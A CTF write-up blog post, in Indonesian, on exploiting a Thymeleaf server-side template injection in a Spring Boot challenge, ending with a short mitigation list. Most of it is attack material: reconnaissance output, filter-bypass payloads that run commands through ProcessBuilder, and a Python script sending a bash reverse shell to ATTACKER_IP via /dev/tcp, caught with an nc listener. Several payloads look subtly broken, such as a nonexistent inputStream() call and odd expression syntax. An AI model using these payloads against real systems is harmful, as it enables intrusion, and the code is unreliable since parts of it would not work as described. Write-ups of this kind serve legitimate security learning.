---
layout: post
title: "Java Spring SSTI Bypass — Google CTF 2025"
categories: [Web]
tags: [SSTI, RCE, Spring, Java, template-injection]
date: 2025-06-21 08:30:00 +0700
author: kali@wsl2
ctf_event: Google CTF 2025
difficulty: Medium
excerpt: "RCE melalui Server-Side Template Injection pada Spring Framework dengan bypass filter berbasis regex."
---

* TOC
{:toc}

## Overview

Challenge ini adalah web vulnerability tentang **SSTI (Server-Side Template Injection)** pada aplikasi Java Spring Boot yang menggunakan **Thymeleaf** sebagai template engine. Ada filter yang mencoba memblokir payload SSTI umum, tapi filter-nya punya lubang. 

## Reconnaissance

### Endpoint Discovery

```bash
$ ffuf -u https://chall.ctf.google/FUZZ -w wordlist.txt

/search          [200] [GET, POST]
/admin           [403]
/actuator        [200]  <-- Spring Actuator exposed!
/actuator/env    [200]
```

Endpoint `/actuator` exposed tanpa autentikasi — informasi sensitif bocor di sini, termasuk versi library.

### Identifikasi Template Engine

Input dari parameter `q` di `/search` direfleksikan ke halaman. Test dasar:

{% raw %}
```
GET /search?q=Hello+World
→ Hello World

GET /search?q=${7*7}
→ ${7*7}   (tidak dieksekusi — bukan FreeMarker/Velocity)

GET /search?q=[[${7*7}]]
→ 49  ✓ Thymeleaf SSTI confirmed!
```
{% endraw %}

## Bypass Filter

Filter yang diterapkan memblokir string-string ini:

```java
// FilterConfig.java (ditemukan via source leak di /actuator/mappings)
String[] blacklist = {
    "Runtime", "exec", "ProcessBuilder",
    "getClass", "forName", "ClassLoader"
};
```

### Teknik Bypass: String Concatenation

{% raw %}
```
[[${T(java.lang.Ru + 'ntime').getRuntime().exec('id')}]]
```
{% endraw %}

Ini tidak work karena `T()` tidak support concatenation langsung. Kita perlu cara lain.

### Bypass via Reflection

{% raw %}
```
[[${T(java.lang.reflect.Method).class
  .forName('java.lang.Runtime')
  .getMethod('exec', T(String[]))
  .invoke(T(java.lang.Runtime).getRuntime(),
    new String[]{'/bin/sh','-c','id'})}]]
```
{% endraw %}

Tapi `forName` juga diblokir. **Final bypass** menggunakan `Class.forName` via Thymeleaf's internal utility:

{% raw %}
```
[[${#strings.toString(
  T(java.lang.ProcessBuilder)
    .getDeclaredConstructors()[0]
    .newInstance([['id']])
    .start()
    .inputStream()
    .readAllBytes()
)}]]
```
{% endraw %}

`ProcessBuilder` tidak ada di blacklist! ✓

## Remote Code Execution

Payload final untuk reverse shell:

{% raw %}
```python
import requests, urllib.parse

cmd = "bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"
payload = f"""[[#{{
  T(java.lang.ProcessBuilder)
    .getDeclaredConstructors()[0]
    .newInstance([['/bin/sh', '-c', '{cmd}']])
    .start()
}}]]"""

r = requests.post(
    'https://chall.ctf.google/search',
    data={'q': payload}
)
```
{% endraw %}

## Flag

```
$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received from 34.120.54.99:
$ cat /flag
CTF{sst1_byp4ss_w1th_pr0c3ssbu1ld3r_n0_r4nd0m_str1ng}
```

## Mitigasi

1. **Sanitasi ketat** — gunakan allowlist, bukan blocklist
2. **Nonaktifkan Spring Actuator** di produksi atau tambahkan autentikasi
3. **Gunakan `th:text`** untuk output yang tidak perlu interpolasi
4. **Security Manager** atau sandbox runtime untuk Java

## Referensi

- [HackTricks — SSTI Thymeleaf](https://book.hacktricks.xyz)
- [Spring Security Documentation](https://spring.io/projects/spring-security)
